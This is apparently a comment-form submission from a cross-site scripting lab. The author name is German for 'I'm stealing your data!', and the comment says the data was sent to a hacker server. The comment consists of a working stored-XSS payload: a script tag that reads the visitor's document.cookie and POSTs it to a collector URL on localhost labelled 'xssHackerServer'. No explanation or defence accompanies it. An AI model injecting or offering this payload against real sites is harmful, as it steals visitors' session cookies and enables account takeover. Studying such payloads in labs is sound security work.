author: Ich klau deine Daten!
comment: Daten an Hackersever gesendet <script>var cookies = document.cookie; var xhr = new XMLHttpRequest(); var url = 'http://localhost/xss/xssHackerServer/'; var params = 'cookies=' + encodeURIComponent(cookies); xhr.open('POST', url, true); xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); xhr.send(params);</script>
